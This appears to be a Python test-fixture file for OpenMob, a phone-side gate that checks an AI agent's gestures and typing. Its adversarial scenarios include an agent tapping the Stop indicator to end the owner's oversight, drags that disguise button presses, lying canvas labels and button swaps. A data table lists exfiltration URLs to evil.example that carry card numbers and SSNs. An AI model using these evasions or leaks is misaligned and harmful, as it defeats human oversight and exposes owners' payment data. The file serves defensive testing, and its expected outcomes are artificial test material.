        button("", "", (60, 600, 340, 680), desc="Blue", cls="android.view.View"),
        node(text="Stop button", cls="android.widget.Switch", bounds=(60, 860, 1020, 940), clickable=True, checked=True)]),
        labels=LABELS),
    # Another accessibility service's overlay is not ours: it still catches touches as before (judged on itself).
    "foreign_overlay_over_shop": screen(app(SHOP, [button("Search", f"{SHOP}:id/search", (0, 1000, W, 1100))]),
        {"id": 22, "type": "accessibility_overlay", "layer": 30, "package": "com.example.app", "title": "",
         "bounds": FULL, "root": node(cls="android.widget.FrameLayout", bounds=FULL)}, labels=LABELS),
})
SCENARIOS += [
    sc("indicator: the border and pill don't get in the way of reads or of taps elsewhere", [
        step("screenshot", "indicator_over_shop", allow()),
        step("ui_elements", "indicator_over_shop", allow()),
        step("tap", "indicator_over_shop", allow(), x=540, y=1050),
        step("tap", "indicator_over_shop", allow(), x=4, y=1050),  # at the very edge, under the border
        step("tap", "indicator_over_shop", allow(), x=1075, y=1050),
        step("swipe", "indicator_over_shop", allow(), x1=540, y1=1500, x2=540, y2=600, duration_ms=300),
        step("tap", "indicator_over_shop", ask("pay", money="start"), x=540, y=1720)],
       tags=["hit_test", "indicator", "friction"]),
    sc("indicator: an agent's tap, long press or swipe on the Stop pill is refused", [
        step("tap", "indicator_over_shop", refuse("gate_denied_page", rule="builtin:own_indicator"), x=980, y=200),
        step("long_press", "indicator_over_shop", refuse("gate_denied_page", rule="builtin:own_indicator"), x=980, y=200),
        step("swipe", "indicator_over_shop", refuse("gate_denied_page", rule="builtin:own_indicator"),
             x1=980, y1=200, x2=980, y2=1200, duration_ms=300),
        step("swipe", "indicator_over_shop", refuse("gate_denied_page", rule="builtin:own_indicator"),
             x1=540, y1=1200, x2=980, y2=200, duration_ms=300),
        step("tap", "indicator_over_shop", allow(), x=980, y=300)], tags=["hit_test", "indicator"]),
    sc("indicator: its settings rows on OpenMob's own screen can't be tapped by agents", [
        step("tap", "openmob_indicator_settings", refuse("gate_denied_page", rule="builtin:own_window"), x=540, y=460),
        step("tap", "openmob_indicator_settings", refuse("gate_denied_page", rule="builtin:own_window"), x=200, y=640),
        step("tap", "openmob_indicator_settings", refuse("gate_denied_page", rule="builtin:own_window"), x=540, y=900)],
       tags=["indicator"]),
    sc("indicator: another service's overlay still catches touches", [
        step("tap", "foreign_overlay_over_shop", allow(), x=540, y=1050)], tags=["hit_test", "indicator"]),
]
ADVERSARIAL += [
    sc("tap OpenMob's Stop pill to end the owner's oversight", [
        step("tap", "indicator_over_shop", refuse("gate_denied_page", rule="builtin:own_indicator"), x=1000, y=250)]),
    # (the bank under the point refuses first: a blocked app's window under the one on top always does)
    sc("tap through the Stop pill into a bank under it", [
        step("tap", "indicator_over_bank", refuse("gate_blocked_app", rule="builtin:sensitive_apps"), x=980, y=200)]),
]


# --- security review, 2026-10-17 ---------------------------------------------------------------------------------------
# H1: a short drag that stays inside the button it started on is a press of that button (Android clicks it on release),
# unless something under it really scrolls that way (a node whose accessibility scroll actions say its content can
# move in the drag's direction: `scroll`). A class name alone (a ScrollView that can't scroll, a ViewPager, a carousel)
# no longer makes a drag a scroll.
MAIL = "com.example.mail"


def in_scroller(pkg, parent_cls, label, scroll=(), extra=()):
    kids = list(extra) + [button(label, "", (100, 1000, 980, 1144))]
    return screen(app(pkg, [node(cls=parent_cls, bounds=(0, 200, W, 2200), scroll=list(scroll), children=[
        node(cls="android.widget.LinearLayout", bounds=(0, 200, W, 2200), children=kids)])]), labels=LABELS)


SCREENS.update({
    "h1_send_static_scrollview": in_scroller(MAIL, "android.widget.ScrollView", "Send"),
    "h1_delete_in_pager": in_scroller(MAIL, "androidx.viewpager.widget.ViewPager", "Delete", scroll=("left", "right")),
    "h1_uninstall_static_scrollview": in_scroller("com.example.app", "androidx.core.widget.NestedScrollView", "Uninstall"),
    "h1_place_order_static_scrollview": in_scroller(SHOP, "android.widget.ScrollView", "Place order",
                                                    extra=[node(text="Total $49.99", bounds=(100, 800, 980, 900))]),
    "h1_send_in_list_at_top": in_scroller(MAIL, "androidx.recyclerview.widget.RecyclerView", "Send", scroll=("down",)),
})
IN_BUTTON_DOWN = dict(x1=540, y1=1010, x2=540, y2=1100, duration_ms=200)  # 90 px, inside the 144 px button
IN_BUTTON_UP = dict(x1=540, y1=1100, x2=540, y2=1010, duration_ms=200)
H1_TASK = dict(task="t1", task_text="read my mail")
SCENARIOS += [
    sc("review H1: a short drag inside Send in a ScrollView that can't scroll asks exactly as a tap does", [
        step("tap", "h1_send_static_scrollview", ask("send", rule="risk:words:send"), x=540, y=1070, **H1_TASK),
        step("swipe", "h1_send_static_scrollview", ask("send", rule="risk:words:send"), **IN_BUTTON_DOWN, **H1_TASK),
        step("swipe", "h1_send_static_scrollview", ask("send", rule="risk:words:send"), **IN_BUTTON_UP, **H1_TASK),
        step("swipe", "h1_send_static_scrollview", ask("send", rule="risk:words:send"), mode="ask", **IN_BUTTON_DOWN, **H1_TASK),
        step("swipe", "h1_send_static_scrollview", ask("send", rule="risk:words:send"), mode="trusted", **IN_BUTTON_DOWN, **H1_TASK),
        step("swipe", "h1_send_static_scrollview", ask("send", rule="risk:words:send"), mode="plan", **IN_BUTTON_DOWN, **H1_TASK)],
       tags=["risk", "review_2026_10_17"]),
    sc("review H1: a vertical drag inside Delete in a sideways pager asks (the pager never takes a vertical drag)", [
        step("tap", "h1_delete_in_pager", ask("delete", rule="risk:words:delete"), x=540, y=1070, **H1_TASK),
        step("swipe", "h1_delete_in_pager", ask("delete", rule="risk:words:delete"), **IN_BUTTON_DOWN, **H1_TASK),
        step("swipe", "h1_delete_in_pager", ask("delete", rule="risk:words:delete"), mode="ask", **IN_BUTTON_UP, **H1_TASK)],
       tags=["risk", "review_2026_10_17"]),
    sc("review H1: a drag inside Uninstall in a NestedScrollView that can't scroll asks", [
        step("swipe", "h1_uninstall_static_scrollview", ask(rule="risk:words:uninstall"), **IN_BUTTON_DOWN, **H1_TASK)],
       tags=["risk", "review_2026_10_17"]),
    sc("review H1: a drag inside Place order with a total on screen asks as a payment; under Don't ask it's refused as the tap is", [
        step("swipe", "h1_place_order_static_scrollview", ask("pay", rule="risk:words:place order", money="terminal"),
             **IN_BUTTON_DOWN, **H1_TASK),
        {"policy": {"type": "never", "duration_ms": 3600000, "allow_money": False}, "sig": "valid", "expect_accepted": True},
        step("tap", "h1_place_order_static_scrollview", refuse("gate_denied", rule="never:money"), x=540, y=1070, **H1_TASK),
        step("swipe", "h1_place_order_static_scrollview", refuse("gate_denied", rule="never:money"),
             **IN_BUTTON_UP, **H1_TASK)],
       tags=["risk", "money", "review_2026_10_17"]),
    sc("review H1: under Don't ask, a drag inside Send is judged as the tap is", [
        {"policy": {"type": "never", "duration_ms": 3600000, "allow_money": False}, "sig": "valid", "expect_accepted": True},
        step("tap", "h1_send_static_scrollview", allow(), x=540, y=1070, **H1_TASK),
        step("swipe", "h1_send_static_scrollview", allow(), **IN_BUTTON_DOWN, **H1_TASK)],
       tags=["risk", "review_2026_10_17"]),
    sc("review H1: a list that can scroll down takes a finger moving up (a scroll); moving down it can't, so that's a press", [
        step("swipe", "h1_send_in_list_at_top", allow(), **IN_BUTTON_UP, **H1_TASK),
        step("swipe", "h1_send_in_list_at_top", ask("send", rule="risk:words:send"), **IN_BUTTON_DOWN, **H1_TASK),
        step("swipe", "h1_send_in_list_at_top", allow(), x1=540, y1=1100, x2=540, y2=400, duration_ms=300, **H1_TASK)],
       tags=["friction", "review_2026_10_17"]),
]
# M3: the Play Store's "names the app" check reads the install button's own card, never the search box; a results page
# (more than one Install/Get) names no app. L2: a server's task text alone doesn't name it either; the phone must hold
# the request (approved here as the task, or typed here), so a named install asks once, as the task prompt.
PLAY = "com.android.vending"
CHESS_TASK = dict(task="t1", task_text="install chess and play 5 moves against a bot")


def play_results(query, results):
    kids = [node(text=query, id=f"{PLAY}:id/search_bar_text", cls="android.widget.EditText", editable=True,
                 bounds=(100, 150, 900, 250))] if query is not None else []
    for i, (title, sponsored) in enumerate(results):
        top = 400 + 300 * i
        card = [node(text=title, bounds=(200, top + 50, 800, top + 120)),
                button("Install", "", (820, top + 50, 1040, top + 140))]
        if sponsored:
            card.insert(0, node(text="Sponsored", bounds=(40, top, 300, top + 40)))
        kids.append(node(cls="android.view.View", bounds=(0, top, W, top + 280), clickable=True, children=card))
    return screen(app(PLAY, kids), labels=LABELS)


SCREENS.update({
    "m3_sponsored_under_search": play_results("chess", [("Mega Casino Slots", True)]),
    "m3_results_page": play_results("chess", [("Mega Casino Slots", True), ("Chess - Play and Learn", False),
                                              ("Chess Clock", False)]),
    "m3_one_result_card": play_results(None, [("Chess - Play and Learn", False)]),
})
SCENARIOS += [
    sc("review M3: the search box's text never names the app; a sponsored result under it asks", [
        step("tap", "m3_sponsored_under_search", ask("install", rule="risk:install:unnamed"), x=930, y=500, **CHESS_TASK)],
       tags=["install", "review_2026_10_17"]),
    sc("review M3: a results page with several Install buttons asks, even on the result the task names", [
        {"instruction": "install chess and play 5 moves against a bot"},
        step("tap", "m3_results_page", ask("install", rule="risk:install:unnamed"), x=930, y=500, **CHESS_TASK),
        step("tap", "m3_results_page", ask("install", rule="risk:install:unnamed"), x=930, y=800, **CHESS_TASK)],
       tags=["install", "review_2026_10_17"]),
    sc("review M3: one result's own card names it", [
        {"instruction": "install chess and play 5 moves against a bot"},
        step("tap", "m3_one_result_card", allow(), x=930, y=500, **CHESS_TASK)], tags=["install", "review_2026_10_17"]),
    sc("review L2: a named install the phone only has the server's word for asks once, as the task; then it runs", [
        step("tap", "play_store_chess", ask("task", rule="risk:task:install:unattested"), x=540, y=860, **CHESS_TASK),
        {"approve": "last", "sig": "valid"},
        step("tap", "play_store_chess", allow(), x=540, y=860, **CHESS_TASK),
        step("tap", "play_store_chess", allow(), x=540, y=860, **CHESS_TASK)], tags=["install", "task_grant", "review_2026_10_17"]),
    sc("review L2: another task text than the one approved doesn't carry the grant", [
        step("tap", "play_store_chess", ask("task", rule="risk:task:install:unattested"), x=540, y=860, **CHESS_TASK),
        {"approve": "last", "sig": "valid"},
        {"advance_ms": 61000},  # past the approved step's own permit; the task grant still holds
        step("tap", "play_store_chess", allow(), x=540, y=860, **CHESS_TASK),
        step("tap", "play_store_chess", ask("task", rule="risk:task:install:unattested"), x=540, y=860, task="t1",
             task_text="install chess")], tags=["install", "task_grant", "review_2026_10_17"]),
    sc("review L2: in Ask every step a named install asks (no task prompt there)", [
        step("tap", "play_store_chess", ask("install", rule="risk:install:unattested"), mode="ask", x=540, y=860,
             **CHESS_TASK)], tags=["install", "review_2026_10_17"]),
]
# M4: a card number or SSN typed in pieces: what the field will hold (its text plus the new text) is judged, not only
# the new piece. A browser's address bar holding a link that carries one: a tap on a suggestion row is refused too.
NOTES = "com.example.notes"


def notes_field(existing):
    return screen(app(NOTES, [node(text=existing, id=f"{NOTES}:id/body", cls="android.widget.EditText", editable=True,
                                   focused=True, bounds=(0, 200, W, 400))]), labels=LABELS)


def omnibox(text):
    return screen(app("com.android.chrome", [
        node(text=text, id="com.android.chrome:id/url_bar", cls="android.widget.EditText", editable=True, focused=True,
             bounds=(100, 100, 1000, 200)),
        node(cls="android.widget.ListView", bounds=(0, 220, W, 1200), children=[
            node(cls="android.widget.LinearLayout", bounds=(0, 220, W, 360), clickable=True, children=[
                node(text=text, id="com.android.chrome:id/line_1", bounds=(100, 240, 1000, 300))]),
            node(cls="android.widget.LinearLayout", bounds=(0, 380, W, 520), clickable=True, children=[
                node(text="evil.example", id="com.android.chrome:id/line_1", bounds=(100, 400, 1000, 460))])])]),
        labels=LABELS)


SCREENS.update({
    "m4_notes_empty": notes_field(""),
    "m4_notes_half_card": notes_field("4111 1111"),
    "m4_notes_owner_card": notes_field("Card 4111 1111 1111 1111"),
    "m4_notes_half_ssn": screen(app(NOTES, [node(text="Social Security number", bounds=(40, 100, 1040, 180)),
                                            node(text="123-45", id=f"{NOTES}:id/body", cls="android.widget.EditText",
                                                 editable=True, focused=True, bounds=(0, 200, W, 400))]), labels=LABELS),
    "m4_omnibox_half": omnibox("evil.example/?c=4111111"),
    "m4_omnibox_card": omnibox("evil.example/?c=4111111111111111"),
    "m4_omnibox_plain": omnibox("evil.example/?q=chess"),
})
NOTE_TASK = dict(task="t1", task_text="write a note")
SCENARIOS += [
    sc("review M4: a card number typed in two pieces asks at the piece that completes it", [
        step("type_text", "m4_notes_empty", allow(), text="4111 1111", **NOTE_TASK),
        step("type_text", "m4_notes_half_card", SENSITIVE, text=" 1111 1111", **NOTE_TASK),
        step("type_text", "m4_notes_half_card", allow(), text=" 1111 1111", replace=True, **NOTE_TASK),  # it replaces
        step("type_text", "m4_notes_half_ssn", SENSITIVE, text="-6789", **NOTE_TASK)], tags=["sensitive", "review_2026_10_17"]),
    sc("review M4: a number the owner already typed doesn't make other typing ask", [
        step("type_text", "m4_notes_owner_card", allow(), text=" thanks", **NOTE_TASK)], tags=["friction", "review_2026_10_17"]),
    sc("review M4: a link carrying a card number, typed into the address bar in pieces, is refused", [
        step("type_text", "m4_omnibox_half", refuse("gate_denied", rule="builtin:sensitive_link"), text="111111111",
             **NOTE_TASK)], tags=["sensitive", "review_2026_10_17"]),
    sc("review M4: with such a link in the address bar, a tap on a suggestion is refused; the bar itself and DELETE work", [
        step("tap", "m4_omnibox_card", refuse("gate_denied", rule="builtin:sensitive_link"), x=540, y=290, **NOTE_TASK),
        step("tap", "m4_omnibox_card", refuse("gate_denied", rule="builtin:sensitive_link"), x=540, y=450, **NOTE_TASK),
        step("key", "m4_omnibox_card", allow(), name="DELETE", **NOTE_TASK),
        step("tap", "m4_omnibox_card", allow(), x=540, y=150, **NOTE_TASK),
        step("tap", "m4_omnibox_plain", allow(), x=540, y=290, **NOTE_TASK)], tags=["sensitive", "review_2026_10_17"]),
]
# M1: a gesture can't outlast the indicator: a swipe or long press over 10 s is refused (rules.json swipe.max_ms).
SCENARIOS += [
    sc("review M1: a swipe or long press longer than 10 s is refused; 10 s itself is fine", [
        step("swipe", "wiki_page", refuse("gate_denied", rule="builtin:gesture_too_long"), x1=540, y1=1800, x2=540,
             y2=600, duration_ms=60000),
        step("long_press", "wiki_page", refuse("gate_denied", rule="builtin:gesture_too_long"), x=540, y=1800,
             duration_ms=10001),
        step("swipe", "wiki_page", allow(), x1=540, y1=1800, x2=540, y2=600, duration_ms=10000),
        step("long_press", "amazon_product", allow(), x=540, y=610, duration_ms=1500)], tags=["review_2026_10_17"]),
]

SENSITIVE_NUMBERS = {
    "texts": [
        {"text": t, "ssn_context": s, "card_field": c, "expect": e} for t, s, c, e in [
            ("4111 1111 1111 1111", False, False, "card"),
            ("4111111111111111", False, False, "card"),
            ("4111-1111-1111-1111", False, False, "card"),
            ("4111 1111 1111 1111 12/29 123", False, False, "card"),
            ("card: 4111111111111111 exp 12/29", False, False, "card"),
            ("5555555555554444", False, False, "card"),
            ("378282246310005", False, False, "card"),
            ("3782 822463 10005", False, False, "card"),
            ("6011111111111117", False, False, "card"),
            ("2223003122003222", False, False, "card"),
            ("４１１１１１１１１１１１１１１１", False, False, "card"),  # fullwidth digits (NFKC)
            ("4111 1111 1111 1112", False, False, None),  # Luhn fails
            ("1111111111111117", False, False, None),  # first digit outside 2-6
            ("+4915123456789", False, False, None),  # an international phone number
            ("+1 415 555 2671", False, False, None),
            ("415-555-2671", False, False, None),
            ("(415) 555-2671", False, False, None),
            ("555-123-4567 555-987-6543", False, False, None),  # two phone numbers in a row
            ("2026-10-10", False, False, None),
            ("10/10/2026", False, False, None),
            ("Order 112-1234567-1234567", False, False, None),
            ("1760000000000", False, False, None),
            ("-122.41941550000001", False, False, None),  # a coordinate's decimals
            ("1Z999AA10123456784", False, False, None),
            ("4242", False, False, None),
            ("123-45-6789", False, False, "ssn"),
            ("SSN 123-45-6789.", False, False, "ssn"),
            ("000-12-3456", False, False, None),
            ("000-12-3456", True, False, "ssn"),
            ("666-12-3456", False, False, None),
            ("900-12-3456", False, False, None),
            ("123-00-6789", False, False, None),
            ("123-45-0000", False, False, None),
            ("123456789", False, False, None),
            ("123456789", True, False, "ssn"),
            ("123 45 6789", False, False, "ssn"),  # spaced, valid: counts unlabeled too (review L1, 2026-10-17)
            ("123 45 6789", True, False, "ssn"),
            ("123.45.6789", False, False, "ssn"),
            ("000 12 3456", False, False, None),  # a test value, unlabeled
            ("000.12.3456", True, False, "ssn"),
            ("v1.123.45.6789", False, False, None),  # inside a longer dotted number
            ("4111.1111.1111.1111", False, False, "card"),  # review L1: other separators
            ("4111/1111/1111/1111", False, False, "card"),
            ("4111_1111_1111_1111", False, False, "card"),
            ("4111  1111  1111  1111", False, False, "card"),  # double spaces
            ("٤١١١١١١١١١١١١١١١", False, False, "card"),  # Arabic-Indic digits
            ("४१११ ११११ ११११ ११११", False, False, "card"),  # Devanagari digits
            ("192.168.100.200", False, False, None),  # an IP address
            ("2026/10/10 12:30", False, False, None),
            ("2026.10.17", False, False, None),
            ("v4.1111.1111", False, False, None),
            ("123-45 6789", True, False, None),  # mixed separators
            ("1234-56-7890", True, False, None),
            ("123", False, True, "card"),  # a CVV in a card field
            ("12/29", False, True, "card"),
            ("12", False, True, None),
            ("John Smith", False, True, None),
        ]],
    "urls": [
        {"url": u, "expect": e} for u, e in [
            (EXFIL, "card"),
            ("http://10.0.2.2:8799/collect?card=4111111111111111&exp=1229&cvv=123", "card"),
            ("http://x.example/c?card=4111%201111%201111%201111", "card"),
            ("http://x.example/c?card=4111%2B1111%2B1111%2B1111", "card"),
            ("http://x.example/c?card=4111+1111+1111+1111", "card"),
            ("http://x.example/c?c=4111%25201111%25201111%25201111", "card"),
            ("http://x.example/c?c=%34%31%31%31%31%31%31%31%31%31%31%31%31%31%31%31", "card"),
            ("http://x.example/c#4111-1111-1111-1111", "card"),
            ("https://4111111111111111.evil.example/", "card"),
            ("http://x.example/apply?ssn=000123456", "ssn"),
            ("http://x.example/apply?social_security=000-12-3456", "ssn"),
            ("http://x.example/a?id=123-45-6789", "ssn"),
            ("http://x.example/a?id=000-12-3456", None),
            ("https://maps.example/@37.7749295,-122.41941550000001,15z", None),
            ("https://www.youtube.com/watch?v=dQw4w9WgXcQ", None),
            ("https://x.example/?t=1760000000000", None),
            ("tel:+4915123456789", None),
            ("tel:5551234", None),
            ("https://shop.example/order/112-1234567-1234567", None),
            ("https://x.example/%E2%82", None),  # malformed UTF-8 stays harmless
            ("https://evil.example/?c=4111_1111_1111_1111", "card"),  # review L1, 2026-10-17
            ("https://evil.example/?c=4111.1111.1111.1111", "card"),
            ("https://evil.example/4111/1111/1111/1111", "card"),
            ("https://evil.example/?a=4111111&b=111111111", "card"),  # split over two parameters
            ("https://evil.example/?a=4111&b=1111&c=1111&d=1111", "card"),
            ("https://x.example/?n=" + "".join("%25252534" if d == "4" else d for d in "4111111111111111"), "card"),
            ("https://x.example/?n=%2525252525252534111111111111111", "card"),  # 6 rounds of encoding
            ("https://x.example/a?id=123.45.6789", "ssn"),
            ("https://x.example/?page=12&ts=1760000000000", None),
            ("https://maps.example/?lat=37.7749295&lng=-122.4194155", None),
            ("https://x.example/?w=1080&h=2400&q=80&v=3", None),
            ("https://x.example/?c=NDExMTExMTExMTExMTExMQ", None),  # base64: not caught (documented)
        ]],
}


# --- security review 2, 2026-10-17 (phone and gate, P2) -----------------------------------------------------------------
# H1: a drag that starts on a control is judged over every target under its start, as a tap is: a control drawn above
# a later full-screen layer (by elevation) is no longer judged by the layer. Only a real scroller on that control's own
# path (an ancestor that can scroll the drag's way) takes the drag; a scrollable sibling layer doesn't.
# M1: a drag that starts on a clickable control is at least as strict as a tap on it, wherever it ends (every rule:
# permission dialogs, Settings refusals, calls, uninstall, install, share), and the touch slop is the phone's own
# (screen "touch_slop", ViewConfiguration.getScaledTouchSlop) when it's larger than rules.json's 24 px.
R2_TASK = dict(task="t1", task_text="check my stuff")


def scrolling_layer(top=0, bottom=H):
    """A later full-screen sibling layer that really scrolls (it can't take a touch on a control outside it)."""
    return node(cls="android.view.ViewGroup", bounds=(0, top, W, bottom), children=[
        node(cls="androidx.recyclerview.widget.RecyclerView", id="feed", bounds=(0, top, W, bottom), scroll=["down", "up"],
             children=[node(text="Your basket: 2 items", bounds=(0, 300, W, 400))])])


SCREENS.update({
    "r2_place_order_scrolling_layer": screen(app(SHOP, [
        node(text="Total $49.99", bounds=(0, 0, W, 200)),
        button("Place order", f"{SHOP}:id/place_order", (40, 2050, 1040, 2200)),
        scrolling_layer()]), labels=LABELS),
    "r2_send_in_list_at_top_dense": dict(SCREENS["h1_send_in_list_at_top"], touch_slop=30),
    "r2_pager_cards": screen(app(MAIL, [
        node(cls="androidx.viewpager2.widget.ViewPager2", bounds=(0, 200, W, 1400), scroll=["right"], children=[
            node(cls="android.widget.FrameLayout", bounds=(0, 200, W, 1400), clickable=True, children=[
                node(text="Delete old mail", bounds=(40, 600, 1040, 700))])])]), labels=LABELS),
})
SCENARIOS += [
    sc("review 2 H1: a drag inside a control drawn above a later full-screen layer is judged as the tap", [
        step("swipe", "dialer_google_layered", ask("call", rule="risk:call:dial"), x1=540, y1=2200, x2=540, y2=2280,
             duration_ms=200, **R2_TASK),
        step("swipe", "dialer_google_layered", ask("call", rule="risk:call:dial"), mode="ask", x1=540, y1=2200, x2=540,
             y2=2280, duration_ms=200, **R2_TASK),
        step("swipe", "hit_place_order_layered", ask("pay", money="terminal", rule="risk:words:place your order"),
             x1=540, y1=1640, x2=540, y2=1700, duration_ms=200, **R2_TASK),
        step("swipe", "hit_send_toolbar", ask("send", rule="risk:words:send"), x1=980, y1=2290, x2=980, y2=2210,
             duration_ms=200, **R2_TASK),
        step("swipe", "hit_delete_layered", ask("delete", rule="risk:words:trash"), x1=900, y1=2260, x2=900, y2=2140,
             duration_ms=200, **R2_TASK),
        step("swipe", "hit_settings_layered", ask("settings", rule="risk:settings_page"), mode="ask", x1=540, y1=450,
             x2=540, y2=510, duration_ms=200, **R2_TASK)],
       tags=["risk", "hit_test", "review2_2026_10_17"]),
    sc("review 2 H1: a scrollable sibling layer doesn't take a drag on a control outside it; a scroll on the layer still scrolls", [
        step("swipe", "r2_place_order_scrolling_layer", ask("pay", money="terminal", rule="risk:words:place order"),
             x1=540, y1=2170, x2=540, y2=2070, duration_ms=200, **R2_TASK),
        step("swipe", "r2_place_order_scrolling_layer", allow(), x1=540, y1=1500, x2=540, y2=600, duration_ms=300,
             **R2_TASK)],
       tags=["risk", "friction", "review2_2026_10_17"]),
    sc("review 2 M1: a drag that leaves a control past the slop is judged as the tap, with every rule", [
        step("swipe", "permission_dialog_other", ask("permission", rule="risk:permission:other_app"), x1=540, y1=1550,
             x2=540, y2=1626, duration_ms=200, task="t1", task_text="play chess"),
        step("swipe", "settings_dev", refuse("gate_denied_page", rule="builtin:settings_security"), x1=400, y1=480,
             x2=400, y2=566, duration_ms=200),
        step("swipe", "dialer_google", ask("call", rule="risk:call:dial"), x1=540, y1=2040, x2=540, y2=2176,
             duration_ms=200),
        step("swipe", "dialer_google", ask("call", rule="risk:call:dial"), x1=540, y1=2040, x2=540, y2=1200,
             duration_ms=300),  # far past it: still the Call button's press
        step("swipe", "uninstall_chess", ask("delete", rule="risk:uninstall:installer"), x1=900, y1=1380, x2=900,
             y2=1476, duration_ms=200, task="t1", task_text="play chess"),
        step("swipe", "share_sheet", ask("share", rule="risk:share:content"), x1=170, y1=1550, x2=170, y2=1726,
             duration_ms=200, task="t1", task_text="look at photos"),
        step("swipe", "hit_install_layered", ask("install", rule="risk:install:unnamed"), x1=540, y1=860, x2=540,
             y2=946, duration_ms=200, task="t1", task_text="check the weather")],
       tags=["risk", "review2_2026_10_17"]),
    sc("review 2 M1: the phone's own touch slop: a 55 px drag is a tap at 30 px slop, a scroll at 24 px", [
        step("swipe", "h1_send_in_list_at_top", allow(), x1=540, y1=1100, x2=540, y2=1045, duration_ms=200, **H1_TASK),
        step("swipe", "r2_send_in_list_at_top_dense", ask("send", rule="risk:words:send"), x1=540, y1=1100, x2=540,
             y2=1045, duration_ms=200, **H1_TASK)],
       tags=["risk", "review2_2026_10_17"]),
    sc("review 2 H1: a sideways swipe on a pager card that can scroll that way is a page turn, judged by its words", [
        step("swipe", "r2_pager_cards", ask("delete"), x1=900, y1=650, x2=100, y2=650, duration_ms=300, **R2_TASK),
        step("swipe", "r2_pager_cards", ask("delete"), x1=100, y1=650, x2=900, y2=650, duration_ms=300, **R2_TASK)],
       tags=["risk", "review2_2026_10_17"]),
]

# M2: an app's name for a free install comes only from the request text the phone holds, never the server's task id.
SCENARIOS += [
    sc("review 2 M2: a task id naming the app doesn't name it; the approved text doesn't either", [
        step("task_grant", "launcher", ask("task"), task="t1-torchlight", text="check the weather"),
        {"approve": "last", "sig": "valid"},
        {"advance_ms": 10000},
        step("tap", "hit_install_layered", ask("install", rule="risk:install:unnamed"), x=540, y=860,
             task="t1-torchlight", task_text="check the weather")],
       tags=["install", "task_grant", "review2_2026_10_17"]),
    sc("review 2 M2: the same with a request typed on the phone", [
        {"instruction": "check the weather"},
        step("tap", "hit_install_layered", ask("install", rule="risk:install:unnamed"), x=540, y=860,
             task="torchlight", task_text="check the weather")],
       tags=["install", "review2_2026_10_17"]),
]

# M3: drawn spots (a game's canvas, a canvas web page): the phone OCRs the words drawn near the point ("canvas_ocr",
# screen pixels) and judges them as the target's label; a failed read (None) asks; the re-check reads them again.
GAME = "com.example.brickdrop"
LABELS[GAME] = "Brick Drop"


def ocr_at(text, box, conf=0.9):
    return {"text": text, "bounds": list(box), "conf": conf}


def game(drawn, cls="android.view.SurfaceView", extra=()):
    return screen(app(GAME, [node(cls=cls, bounds=FULL)] + list(extra)), labels=LABELS, canvas_ocr=drawn)


PLAY_LINE = ocr_at("PLAY", (440, 1100, 640, 1180))
SCREENS.update({
    "r2_game_play": game([PLAY_LINE, ocr_at("Level 3", (400, 300, 680, 360))]),
    "r2_game_buy": game([ocr_at("Buy 500 gems $4.99", (380, 1100, 700, 1180))]),
    "r2_game_gems_price_below": game([ocr_at("500 GEMS", (440, 1100, 640, 1180)), ocr_at("$4.99", (470, 1250, 610, 1300))]),
    "r2_game_delete_save": game([ocr_at("Delete save", (400, 1100, 680, 1180))]),
    "r2_game_unread": game(None),
    "r2_game_row_neighbours": game([PLAY_LINE, ocr_at("REMOVE ADS $2.99", (750, 1100, 1060, 1180)),
                                    ocr_at("Shop", (440, 1700, 640, 1760))]),
    # A canvas web page with a tiny aria-label over a drawn purchase (S2 F3's lie, on the phone).
    "r2_web_canvas_label_lie": screen(app("com.android.chrome", [
        node(cls="android.webkit.WebView", desc="Brick Drop", bounds=(0, 200, W, H), children=[
            node(cls="android.view.View", bounds=(0, 200, W, H)),
            button("Play", "", (500, 1120, 580, 1160), cls="android.view.View")])]), labels=LABELS,
        canvas_ocr=[ocr_at("Buy 500 gems $4.99", (380, 1100, 700, 1180))]),
    # A labeled app with an unlabeled spot: OCR'd too (nothing risky drawn there: allowed).
    "r2_unlabeled_spot": screen(app("com.example.app", [node(text="Hello", bounds=(0, 200, W, 300))]), labels=LABELS,
                                canvas_ocr=[ocr_at("Hello", (0, 200, W, 300))]),
})
CANVAS_TAP = dict(x=540, y=1140)
SCENARIOS += [
    sc("review 2 M3: a drawn Play is allowed; drawn purchase, delete and price-below words ask; an unread canvas asks", [
        step("tap", "r2_game_play", allow(), **CANVAS_TAP, **R2_TASK),
        step("tap", "r2_game_buy", ask("pay"), **CANVAS_TAP, **R2_TASK),
        step("tap", "r2_game_gems_price_below", ask("pay"), **CANVAS_TAP, **R2_TASK),
        step("tap", "r2_game_delete_save", ask("delete"), **CANVAS_TAP, **R2_TASK),
        step("tap", "r2_game_unread", ask("other", rule="risk:canvas_unread"), **CANVAS_TAP),
        step("tap", "r2_game_unread", ask("task", rule="risk:task:canvas_unread"), **CANVAS_TAP, **R2_TASK),
        step("long_press", "r2_game_buy", ask("pay"), duration_ms=800, **CANVAS_TAP, **R2_TASK)],
       tags=["risk", "money", "review2_2026_10_17"]),
    sc("review 2 M3: the reach is the control's row: a neighbour's words 0.2 of the width away don't count", [
        step("tap", "r2_game_row_neighbours", allow(), **CANVAS_TAP, **R2_TASK),
        step("tap", "r2_unlabeled_spot", allow(), x=540, y=250, **R2_TASK)],
       tags=["friction", "review2_2026_10_17"]),
    sc("review 2 M3: a drawn button swapped between the check and the gesture is refused", [
        step("tap", "r2_game_play", refuse("gate_screen_changed", rule="builtin:toctou"), reverify="r2_game_buy",
             **CANVAS_TAP, **R2_TASK),
        step("tap", "r2_game_play", refuse("gate_screen_changed", rule="builtin:toctou"), reverify="r2_game_unread",
             **CANVAS_TAP, **R2_TASK),
        step("tap", "r2_game_play", allow(), reverify="r2_game_play", **CANVAS_TAP, **R2_TASK)],
       tags=["risk", "review2_2026_10_17"]),
    sc("review 2 M3: a drag that starts on a drawn purchase asks; a tiny label over a drawn purchase can't vouch for it", [
        step("swipe", "r2_game_buy", ask("pay"), x1=540, y1=1140, x2=540, y2=600, duration_ms=300, **R2_TASK),
        step("swipe", "r2_game_play", allow(), x1=540, y1=1140, x2=540, y2=600, duration_ms=300, **R2_TASK),
        step("tap", "r2_web_canvas_label_lie", ask("pay"), **CANVAS_TAP, **R2_TASK)],
       tags=["risk", "money", "review2_2026_10_17"]),
]

# L2: typing is judged as the phone inserts it, at the cursor ("sel_start"/"sel_end"). L3: numbers and flags must be
# real JSON numbers and booleans. I-3: on a tie, the prompt names the labeled target.
SCREENS.update({
    "r2_notes_tail_cursor_at_start": screen(app(NOTES, [node(text="1111", id=f"{NOTES}:id/body", cls="android.widget.EditText",
                                                             editable=True, focused=True, bounds=(0, 200, W, 400),
                                                             sel_start=0, sel_end=0)]), labels=LABELS),
